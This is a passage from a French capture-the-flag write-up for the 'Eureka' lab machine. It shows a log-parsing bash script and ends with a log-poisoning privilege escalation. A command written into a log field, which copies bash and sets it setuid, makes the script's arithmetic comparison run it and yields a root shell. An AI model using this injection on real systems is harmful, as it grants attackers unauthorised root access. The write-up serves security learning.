+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">Error: Log file </span><span class="nv">$LOG_FILE</span><span class="s2"> not found.</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">analyze_logins<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Process successful logins</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r line<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$line</span><span class="s2">&#34;</span> <span class="p">|</span> awk -F<span class="s2">&#34;&#39;&#34;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="si">${</span><span class="nv">successful_users</span><span class="p">[</span><span class="nv">$username</span><span class="p">]+_</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            successful_users<span class="o">[</span><span class="nv">$username</span><span class="o">]=</span><span class="k">$((</span>successful_users<span class="o">[</span><span class="nv">$username</span><span class="o">]</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            successful_users<span class="o">[</span><span class="nv">$username</span><span class="o">]=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span> &lt; &lt;<span class="o">(</span>grep <span class="s2">&#34;LoginSuccessLogger&#34;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Process failed logins</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r line<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$line</span><span class="s2">&#34;</span> <span class="p">|</span> awk -F<span class="s2">&#34;&#39;&#34;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="si">${</span><span class="nv">failed_users</span><span class="p">[</span><span class="nv">$username</span><span class="p">]+_</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            failed_users<span class="o">[</span><span class="nv">$username</span><span class="o">]=</span><span class="k">$((</span>failed_users<span class="o">[</span><span class="nv">$username</span><span class="o">]</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            failed_users<span class="o">[</span><span class="nv">$username</span><span class="o">]=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span> &lt; &lt;<span class="o">(</span>grep <span class="s2">&#34;LoginFailureLogger&#34;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">analyze_http_statuses<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Process HTTP status codes</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r line<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">code</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$line</span><span class="s2">&#34;</span> <span class="p">|</span> grep -oP <span class="s1">&#39;Status: \K.*&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">found</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Check if code exists in STATUS_CODES array</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> i in <span class="s2">&#34;</span><span class="si">${</span><span class="p">!STATUS_CODES[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">existing_entry</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">STATUS_CODES</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">existing_code</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$existing_entry</span><span class="s2">&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">existing_count</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$existing_entry</span><span class="s2">&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$existing_code</span><span class="s2">&#34;</span> -eq <span class="s2">&#34;</span><span class="nv">$code</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">new_count</span><span class="o">=</span><span class="k">$((</span>existing_count <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
+</span></span><span class="line"><span class="cl">                STATUS_CODES<span class="o">[</span><span class="nv">$i</span><span class="o">]=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">existing_code</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">new_count</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">            <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span> &lt; &lt;<span class="o">(</span>grep <span class="s2">&#34;HTTP.*Status: &#34;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">analyze_log_errors<span class="o">(){</span>
+</span></span><span class="line"><span class="cl">     <span class="c1"># Log Level Counts (colored)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">[+] Log Level Counts:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">log_levels</span><span class="o">=</span><span class="k">$(</span>grep -oP <span class="s1">&#39;(?&lt;=Z  )\w+&#39;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span> <span class="p">|</span> sort <span class="p">|</span> uniq -c<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$log_levels</span><span class="s2">&#34;</span> <span class="p">|</span> awk -v <span class="nv">blue</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$BLUE</span><span class="s2">&#34;</span> -v <span class="nv">yellow</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$YELLOW</span><span class="s2">&#34;</span> -v <span class="nv">red</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RED</span><span class="s2">&#34;</span> -v <span class="nv">reset</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RESET</span><span class="s2">&#34;</span> <span class="s1">&#39;{
+</span></span></span><span class="line"><span class="cl"><span class="s1">        if ($2 == &#34;INFO&#34;) color=blue;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        else if ($2 == &#34;WARN&#34;) color=yellow;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        else if ($2 == &#34;ERROR&#34;) color=red;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        else color=reset;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        printf &#34;%s%6s %s%s\n&#34;, color, $1, $2, reset
+</span></span></span><span class="line"><span class="cl"><span class="s1">    }&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># ERROR Messages</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">error_messages</span><span class="o">=</span><span class="k">$(</span>grep <span class="s1">&#39; ERROR &#39;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span> <span class="p">|</span> awk -F<span class="s1">&#39; ERROR &#39;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">[+] ERROR Messages:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$error_messages</span><span class="s2">&#34;</span> <span class="p">|</span> awk -v <span class="nv">red</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RED</span><span class="s2">&#34;</span> -v <span class="nv">reset</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RESET</span><span class="s2">&#34;</span> <span class="s1">&#39;{print red $0 reset}&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Eureka Errors</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">eureka_errors</span><span class="o">=</span><span class="k">$(</span>grep <span class="s1">&#39;Connect to http://localhost:8761.*failed: Connection refused&#39;</span> <span class="s2">&#34;</span><span class="nv">$LOG_FILE</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">eureka_count</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$eureka_errors</span><span class="s2">&#34;</span> <span class="p">|</span> wc -l<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">[+] Eureka Connection Failures:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">Count: </span><span class="nv">$eureka_count</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$eureka_errors</span><span class="s2">&#34;</span> <span class="p">|</span> tail -n <span class="m">2</span> <span class="p">|</span> awk -v <span class="nv">yellow</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$YELLOW</span><span class="s2">&#34;</span> -v <span class="nv">reset</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RESET</span><span class="s2">&#34;</span> <span class="s1">&#39;{print yellow $0 reset}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">display_results<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">BLUE</span><span class="si">}</span><span class="s2">----- Log Analysis Report -----</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Successful logins</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">[+] Successful Login Counts:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">total_success</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> user in <span class="s2">&#34;</span><span class="si">${</span><span class="p">!successful_users[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">count</span><span class="o">=</span><span class="si">${</span><span class="nv">successful_users</span><span class="p">[</span><span class="nv">$user</span><span class="p">]</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">printf</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">%6s %s</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">\n&#34;</span> <span class="s2">&#34;</span><span class="nv">$count</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$user</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">total_success</span><span class="o">=</span><span class="k">$((</span>total_success <span class="o">+</span> count<span class="k">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">\nTotal Successful Logins: </span><span class="nv">$total_success</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Failed logins</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">[+] Failed Login Attempts:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">total_failed</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> user in <span class="s2">&#34;</span><span class="si">${</span><span class="p">!failed_users[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">count</span><span class="o">=</span><span class="si">${</span><span class="nv">failed_users</span><span class="p">[</span><span class="nv">$user</span><span class="p">]</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">printf</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">%6s %s</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">\n&#34;</span> <span class="s2">&#34;</span><span class="nv">$count</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$user</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">total_failed</span><span class="o">=</span><span class="k">$((</span>total_failed <span class="o">+</span> count<span class="k">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">\nTotal Failed Login Attempts: </span><span class="nv">$total_failed</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># HTTP status codes</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">CYAN</span><span class="si">}</span><span class="s2">[+] HTTP Status Code Distribution:</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">total_requests</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Sort codes numerically</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">IFS</span><span class="o">=</span><span class="s1">$&#39;\n&#39;</span> <span class="nv">sorted</span><span class="o">=(</span><span class="k">$(</span>sort -n -t<span class="s1">&#39;:&#39;</span> -k1 <span class="o">&lt;&lt;&lt;</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">STATUS_CODES</span><span class="p">[*]</span><span class="si">}</span><span class="s2">&#34;</span><span class="k">)</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">unset</span> IFS
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> entry in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">sorted</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">code</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$entry</span><span class="s2">&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">count</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$entry</span><span class="s2">&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">total_requests</span><span class="o">=</span><span class="k">$((</span>total_requests <span class="o">+</span> count<span class="k">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Color coding</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$code</span> <span class="o">=</span>~ ^2 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">color</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$GREEN</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="o">[[</span> <span class="nv">$code</span> <span class="o">=</span>~ ^3 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">color</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$YELLOW</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="o">[[</span> <span class="nv">$code</span> <span class="o">=</span>~ ^4 <span class="o">||</span> <span class="nv">$code</span> <span class="o">=</span>~ ^5 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">color</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$RED</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="nv">color</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$CYAN</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">printf</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">color</span><span class="si">}</span><span class="s2">%6s %s</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">\n&#34;</span> <span class="s2">&#34;</span><span class="nv">$count</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$code</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">CYAN</span><span class="si">}</span><span class="s2">\nTotal HTTP Requests Tracked: </span><span class="nv">$total_requests</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Main execution</span>
+</span></span><span class="line"><span class="cl">analyze_logins
+</span></span><span class="line"><span class="cl">analyze_http_statuses
+</span></span><span class="line"><span class="cl">display_results <span class="p">|</span> tee <span class="s2">&#34;</span><span class="nv">$OUTPUT_FILE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">analyze_log_errors <span class="p">|</span> tee -a <span class="s2">&#34;</span><span class="nv">$OUTPUT_FILE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\n</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">Analysis completed. Results saved to </span><span class="nv">$OUTPUT_FILE</span><span class="si">${</span><span class="nv">RESET</span><span class="si">}</span><span class="s2">&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-39.png"
+        data-srcset="/images/Eureka/Eureka-39.png, /images/Eureka/Eureka-39.png 1.5x, /images/Eureka/Eureka-39.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-39.png"
+        title="/images/Eureka/Eureka-39.png" width="1781" height="941" /></p>
+<p>J&rsquo;ai confirmé que le fichier <code>/var/www/web/cloud-gateway/log/application.log</code> était réactualiser toutes les quelques secondes. Donc je pourrais tenter du <code>log poisonning</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]&#39;</span> &gt; application.log</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-40.png"
+        data-srcset="/images/Eureka/Eureka-40.png, /images/Eureka/Eureka-40.png 1.5x, /images/Eureka/Eureka-40.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-40.png"
+        title="/images/Eureka/Eureka-40.png" width="1907" height="425" /></p>
+<p>Quelques secondes plus tard, le fichier est créé.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-41.png"
+        data-srcset="/images/Eureka/Eureka-41.png, /images/Eureka/Eureka-41.png 1.5x, /images/Eureka/Eureka-41.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-41.png"
+        title="/images/Eureka/Eureka-41.png" width="1358" height="291" /></p>
+<p>Je peux donc l’exécuter et obtenir un Shell en tant que root.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Eureka/Eureka-42.png"
+        data-srcset="/images/Eureka/Eureka-42.png, /images/Eureka/Eureka-42.png 1.5x, /images/Eureka/Eureka-42.png 2x"
+        data-sizes="auto"
+        alt="/images/Eureka/Eureka-42.png"
+        title="/images/Eureka/Eureka-42.png" width="1443" height="702" /></p>
+<p>Merci d&rsquo;avoir lu jusqu&rsquo;ici.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif"
+        data-srcset="https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif, https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif 1.5x, https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif 2x"
+        data-sizes="auto"
+        alt="https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif"
+        title="ThankYou" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/eureka/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/eureka/" data-title="Eureka" data-via="z3rodol" data-hashtags="Hard,Linux,SSRF,Log Poisoning,Springboot Heapdump"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/hard/">Hard</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/ssrf/">SSRF</a>,&nbsp;<a href="/tags/log-poisoning/">Log Poisoning</a>,&nbsp;<a href="/tags/springboot-heapdump/">Springboot Heapdump</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/down/" class="prev" rel="prev" title="Down"><i class="fas fa-angle-left" aria-hidden="true"></i>Down</a>
+            <a href="/solidstate/" class="next" rel="next" title="SolidState">SolidState<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
